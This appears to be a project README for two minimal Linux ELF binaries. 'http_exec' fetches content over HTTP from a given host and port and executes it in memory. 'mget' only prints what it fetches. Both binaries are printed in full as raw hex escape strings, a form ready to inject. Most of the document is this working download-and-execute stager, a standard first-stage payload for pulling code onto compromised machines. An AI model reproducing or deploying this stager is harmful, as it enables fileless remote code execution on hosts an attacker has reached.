# http_exec

http_exec is a super small ELF that will make an HTTP request to a remote HTTP server, download the contents, and exec it.

mget is a super small ELF that will make an HTTP request to a remote HTTP server, and output the contents.


## Usage

```sh
./http_exec <HOST> <PORT>
```

```sh
./mget <HOST> <PORT>
```


## Building

Build the docker container with `./build.sh`.

Build http_exec with `cd http_exec && ./run.sh`.

Build mget with `cd mget && ./run.sh`.


## Size

http_exec: 932 bytes

mget: 868 bytes


## Raw Hex Encoded

### http_exec

```
\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00\x01\x00\x00\x00\x50\x01\x40\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x38\x00\x04\x00\x40\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\xa4\x03\x00\x00\x00\x00\x00\x00\xa4\x03\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x20\x01\x00\x00\x00\x00\x00\x00\x20\x01\x40\x00\x00\x00\x00\x00\x20\x01\x40\x00\x00\x00\x00\x00\x24\x00\x00\x00\x00\x00\x00\x00\x24\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x04\x00\x00\x00\xa4\x03\x00\x00\x00\x00\x00\x00\x00\x10\x60\x00\x00\x00\x00\x00\x00\x10\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x51\xe5\x74\x64\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x14\x00\x00\x00\x03\x00\x00\x00\x47\x4e\x55\x00\x2c\x22\x5b\x31\x37\x77\xab\xca\x68\x60\x6b\xf1\xb2\xff\x92\x63\x62\x2d\xe1\xa9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x55\x53\x31\xc9\xbe\x02\x00\x00\x00\xba\x01\x00\x00\x00\xbf\x29\x00\x00\x00\x48\x81\xec\x38\x10\x00\x00\x31\xc0\xe8\x8f\x01\x00\x00\x48\x8b\x8c\x24\x58\x10\x00\x00\x66\xc7\x44\x24\x20\x02\x00\x31\xf6\xc7\x44\x24\x30\x00\x00\x00\x00\x41\xb0\x0a\x8a\x11\x84\xd2\x74\x22\x80\xfa\x2e\x75\x04\xff\xc6\xeb\x14\x48\x0f\xbe\xfe\x8a\x44\x3c\x30\x41\x0f\xaf\xc0\x8d\x54\x02\xd0\x88\x54\x3c\x30\x48\xff\xc1\xeb\xd8\x8b\x44\x24\x30\x48\x8b\x8c\x24\x60\x10\x00\x00\x89\x44\x24\x24\x31\xc0\x0f\xbe\x11\x84\xd2\x74\x0c\x6b\xc0\x0a\x48\xff\xc1\x8d\x44\x10\xd0\xeb\xed\x48\x8d\x54\x24\x20\xb9\x10\x00\x00\x00\xbe\x03\x00\x00\x00\x66\xc1\xc8\x08\xbf\x2a\x00\x00\x00\x66\x89\x44\x24\x22\x31\xc0\xe8\x02\x01\x00\x00\x48\x8d\x6c\x24\x0f\x48\x8d\x15\x29\x01\x00\x00\xb9\x12\x00\x00\x00\xbe\x03\x00\x00\x00\xbf\x01\x00\x00\x00\x31\xc0\x31\xdb\xe8\xde\x00\x00\x00\x31\xff\x31\xc0\xb9\x01\x00\x00\x00\x48\x89\xea\xbe\x03\x00\x00\x00\xe8\xc8\x00\x00\x00\x48\x85\xc0\x74\x2f\xf6\xc3\x01\x75\x07\x80\x7c\x24\x0f\x0d\x74\x16\xb2\x02\x66\x0f\xbe\xc3\xf6\xfa\x0f\xb6\xc4\xfe\xc8\x75\x10\x80\x7c\x24\x0f\x0a\x75\x09\xff\xc3\x80\xfb\x04\x75\xbc\xeb\x04\x31\xdb\xeb\xb6\x48\x8d\x35\xd2\x00\x00\x00\x48\x8d\x5c\x24\x30\xba\x01\x00\x00\x00\xbf\x3f\x01\x00\x00\x31\xc0\xe8\x77\x00\x00\x00\x31\xff\xb9\x00\x10\x00\x00\x48\x89\xda\xbe\x03\x00\x00\x00\x31\xc0\xe8\x61\x00\x00\x00\x48\x89\xda\x48\x89\xc1\xbe\x04\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\x4a\x00\x00\x00\x48\x85\xc0\x75\xce\x48\x8d\x4c\x24\x10\x4c\x8d\x44\x24\x18\x48\x8d\x15\x79\x00\x00\x00\x41\xb9\x00\x10\x00\x00\xbe\x04\x00\x00\x00\xbf\x42\x01\x00\x00\x48\xc7\x44\x24\x18\x00\x00\x00\x00\x48\xc7\x44\x24\x10\x00\x00\x00\x00\xe8\x0d\x00\x00\x00\x48\x81\xc4\x38\x10\x00\x00\x5b\x5d\xc3\x0f\x1f\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\x48\x3d\x01\xf0\xff\xff\x73\x01\xc3\x48\xc7\xc1\xfc\xff\xff\xff\xf7\xd8\x64\x89\x01\x48\x83\xc8\xff\xc3\x47\x45\x54\x20\x2f\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x01\x7a\x52\x00\x01\x78\x10\x01\x1b\x0c\x07\x08\x90\x01\x00\x00\x2c\x00\x00\x00\x1c\x00\x00\x00\xe8\xfd\xff\xff\xad\x01\x00\x00\x00\x41\x0e\x10\x86\x02\x41\x0e\x18\x83\x03\x58\x0e\xd0\x20\x03\x90\x01\x0e\x18\x41\x0e\x10\x41\x0e\x08\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x4c\x00\x00\x00\x68\xff\xff\xff\x33\x00\x00\x00\x00\x00\x00\x00
```

### mget

```
\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00\x01\x00\x00\x00\x50\x01\x40\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x38\x00\x04\x00\x40\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x64\x03\x00\x00\x00\x00\x00\x00\x64\x03\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x20\x01\x00\x00\x00\x00\x00\x00\x20\x01\x40\x00\x00\x00\x00\x00\x20\x01\x40\x00\x00\x00\x00\x00\x24\x00\x00\x00\x00\x00\x00\x00\x24\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x04\x00\x00\x00\x64\x03\x00\x00\x00\x00\x00\x00\x00\x10\x60\x00\x00\x00\x00\x00\x00\x10\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x51\xe5\x74\x64\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x14\x00\x00\x00\x03\x00\x00\x00\x47\x4e\x55\x00\x26\x16\x55\x84\x43\x48\x8e\x2a\x05\xa5\x47\x7e\xa2\x26\x9d\x96\xcd\x63\x37\x79\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x55\x53\x31\xc9\xbe\x02\x00\x00\x00\xba\x01\x00\x00\x00\xbf\x29\x00\x00\x00\x48\x81\xec\x28\x10\x00\x00\x31\xc0\xe8\x4f\x01\x00\x00\x48\x8b\x8c\x24\x48\x10\x00\x00\x66\xc7\x44\x24\x10\x02\x00\x31\xf6\xc7\x44\x24\x20\x00\x00\x00\x00\x41\xb0\x0a\x8a\x11\x84\xd2\x74\x22\x80\xfa\x2e\x75\x04\xff\xc6\xeb\x14\x48\x0f\xbe\xfe\x8a\x44\x3c\x20\x41\x0f\xaf\xc0\x8d\x54\x02\xd0\x88\x54\x3c\x20\x48\xff\xc1\xeb\xd8\x8b\x44\x24\x20\x48\x8b\x8c\x24\x50\x10\x00\x00\x89\x44\x24\x14\x31\xc0\x0f\xbe\x11\x84\xd2\x74\x0c\x6b\xc0\x0a\x48\xff\xc1\x8d\x44\x10\xd0\xeb\xed\x48\x8d\x54\x24\x10\xb9\x10\x00\x00\x00\xbe\x03\x00\x00\x00\x66\xc1\xc8\x08\xbf\x2a\x00\x00\x00\x66\x89\x44\x24\x12\x31\xc0\xe8\xc2\x00\x00\x00\x48\x8d\x6c\x24\x0f\x48\x8d\x15\xe9\x00\x00\x00\xb9\x12\x00\x00\x00\xbe\x03\x00\x00\x00\xbf\x01\x00\x00\x00\x31\xc0\x31\xdb\xe8\x9e\x00\x00\x00\x31\xff\x31\xc0\xb9\x01\x00\x00\x00\x48\x89\xea\xbe\x03\x00\x00\x00\xe8\x88\x00\x00\x00\x48\x85\xc0\x74\x2f\xf6\xc3\x01\x75\x07\x80\x7c\x24\x0f\x0d\x74\x16\xb2\x02\x66\x0f\xbe\xc3\xf6\xfa\x0f\xb6\xc4\xfe\xc8\x75\x10\x80\x7c\x24\x0f\x0a\x75\x09\xff\xc3\x80\xfb\x04\x75\xbc\xeb\x04\x31\xdb\xeb\xb6\x48\x8d\x5c\x24\x20\x31\xff\xb9\x00\x10\x00\x00\x48\x89\xda\xbe\x03\x00\x00\x00\x31\xc0\xe8\x39\x00\x00\x00\x48\x89\xda\x48\x89\xc1\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\x22\x00\x00\x00\x48\x85\xc0\x75\xce\x31\xf6\xbf\x3c\x00\x00\x00\xe8\x11\x00\x00\x00\x48\x81\xc4\x28\x10\x00\x00\x5b\x5d\xc3\x0f\x1f\x80\x00\x00\x00\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\x48\x3d\x01\xf0\xff\xff\x73\x01\xc3\x48\xc7\xc1\xfc\xff\xff\xff\xf7\xd8\x64\x89\x01\x48\x83\xc8\xff\xc3\x47\x45\x54\x20\x2f\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x01\x7a\x52\x00\x01\x78\x10\x01\x1b\x0c\x07\x08\x90\x01\x00\x00\x2c\x00\x00\x00\x1c\x00\x00\x00\x28\xfe\xff\xff\x69\x01\x00\x00\x00\x41\x0e\x10\x86\x02\x41\x0e\x18\x83\x03\x58\x0e\xc0\x20\x03\x4c\x01\x0e\x18\x41\x0e\x10\x41\x0e\x08\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x4c\x00\x00\x00\x68\xff\xff\xff\x33\x00\x00\x00\x00\x00\x00\x00
```